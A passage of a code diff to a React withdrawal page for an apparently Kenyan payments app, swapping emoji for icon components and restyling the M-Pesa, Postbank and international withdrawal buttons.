         </button>
         {bankOpen && (
           <div style={{ position: 'absolute', top: 'calc(100% + 6px)', left: 0, right: 0, zIndex: 50, background: '#fff', border: '1px solid #e5e7eb', borderRadius: 12, boxShadow: '0 12px 32px rgba(0,0,0,0.18)', overflow: 'hidden' }}>
             <div style={{ display: 'flex', alignItems: 'center', gap: 8, padding: '10px 12px', borderBottom: '1px solid #f1f5f9' }}>
-              <span style={{ fontSize: 16 }}>🔍</span>
+              <span style={{ color: '#9ca3af', display: 'flex' }}><Icon name="search" size={16} /></span>
               <input autoFocus value={bankQuery} onChange={e => setBankQuery(e.target.value)} placeholder="Search banks worldwide…" style={{ flex: 1, border: 'none', outline: 'none', fontSize: 14, background: 'transparent' }} />
             </div>
             <div style={{ maxHeight: 240, overflowY: 'auto' }}>
@@ -648,12 +661,12 @@ function InternationalFlow({ user, initialStep }) {
                 return (
                   <button key={b.id} type="button" onClick={() => selectBank(b)}
                     style={{ display: 'flex', alignItems: 'center', gap: 10, width: '100%', textAlign: 'left', padding: '10px 12px', border: 'none', cursor: 'pointer', background: active ? '#f3f4f6' : '#fff' }}>
-                    <span style={{ fontSize: 20, lineHeight: 1, width: 24, textAlign: 'center' }}>{b.flag}</span>
+                    <CodeBadge code={b.code} size={20} />
                     <span style={{ flex: 1, minWidth: 0 }}>
                       <span style={{ display: 'block', fontWeight: 600, fontSize: 14, color: '#111827', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>{b.name}</span>
                       <span style={{ display: 'block', fontSize: 12, color: '#9ca3af' }}>{b.country}</span>
                     </span>
-                    {active && <span style={{ color: '#374151' }}>✓</span>}
+                    {active && <span style={{ color: '#111827', display: 'flex' }}><Icon name="check" size={16} /></span>}
                   </button>
                 );
               })}
@@ -675,15 +688,15 @@ function InternationalFlow({ user, initialStep }) {
       )}
 
       {formValid ? (
-        <button className="pay-btn" style={{ background: 'linear-gradient(135deg, #1f2937, #374151)', marginTop: 20 }} onClick={handleSubmit} disabled={sending}>
-          {sending ? <><span className="spinner" /> Submitting…</> : '💸 Submit Withdrawal Request'}
+        <button className="pay-btn" style={{ background: '#000000', marginTop: 20 }} onClick={handleSubmit} disabled={sending}>
+          {sending ? <><span className="spinner" /> Submitting…</> : <><Icon name="cash" size={16} /> Submit Withdrawal Request</>}
         </button>
       ) : (
         <div style={{ marginTop: 20, textAlign: 'center', fontSize: 13, color: '#9ca3af', padding: '12px', background: '#f9fafb', borderRadius: 10, border: '1px dashed #e5e7eb' }}>
           {!accountName.trim() ? 'Enter your name to continue' : !selectedBank ? 'Select your bank to continue' : 'Enter a valid account number to reveal Submit'}
         </div>
       )}
-      <div className="pay-secure">🔐 Your account details are encrypted and secure</div>
+      <div className="pay-secure" style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6 }}><Icon name="lock" size={13} /> Your account details are encrypted and secure</div>
     </FlowShell>
   );
 }
@@ -707,21 +720,21 @@ export default function WithdrawPage() {
   // Chooser
   const overLimit = Number(user?.balance || 0) > BULK_THRESHOLD_KES;
   return (
-    <FlowShell title="Withdraw" subtitle="Choose how you’d like to withdraw" icon="💸">
+    <FlowShell title="Withdraw" subtitle="Choose how you’d like to withdraw" icon="cash">
       {overLimit && (
         <div className="pay-message" style={{ borderColor: '#4b5563', background: '#f9fafb', marginBottom: 14 }}>
           Your balance is <strong>KES {Number(user.balance).toLocaleString()}</strong>. Bulk amounts above <strong>KES {BULK_THRESHOLD_KES.toLocaleString()}</strong> must be withdrawn <strong>through the bank</strong>, not M-Pesa.
         </div>
       )}
-      <button className="pay-btn" style={{ background: overLimit ? '#9CA3AF' : 'linear-gradient(135deg, #1f2937, #374151)', marginBottom: overLimit ? 6 : 14, opacity: overLimit ? 0.65 : 1, cursor: overLimit ? 'not-allowed' : 'pointer' }} disabled={overLimit} onClick={() => router.push('/withdraw?method=mpesa')}>
-        📲 Withdraw with M-Pesa
+      <button className="pay-btn" style={{ background: overLimit ? '#9CA3AF' : 'var(--mpesa-green)', marginBottom: overLimit ? 6 : 14, opacity: overLimit ? 0.65 : 1, cursor: overLimit ? 'not-allowed' : 'pointer' }} disabled={overLimit} onClick={() => router.push('/withdraw?method=mpesa')}>
+        <Icon name="smartphone" size={16} /> Withdraw with M-Pesa
       </button>
       {overLimit && <div style={{ fontSize: 12, color: '#4b5563', marginBottom: 14 }}>M-Pesa is unavailable for bulk balances, please use a bank option below.</div>}
-      <button className="pay-btn" style={{ background: 'linear-gradient(135deg, #1f2937, #374151)', marginBottom: 14 }} onClick={() => router.push('/withdraw?method=postbank')}>
-        🏦 Withdraw with Postbank Kenya
+      <button className="pay-btn" style={{ background: '#000000', marginBottom: 14 }} onClick={() => router.push('/withdraw?method=postbank')}>
+        <Icon name="cash" size={16} /> Withdraw with Postbank Kenya
       </button>
-      <button className="pay-btn" style={{ background: 'linear-gradient(135deg, #1f2937, #374151)' }} onClick={() => router.push('/withdraw?method=international')}>
-        🌍 Withdraw from Other Countries
+      <button className="pay-btn" style={{ background: '#000000' }} onClick={() => router.push('/withdraw?method=international')}>
+        <Icon name="globe" size={16} /> Withdraw from Other Countries
       </button>
     </FlowShell>
   );
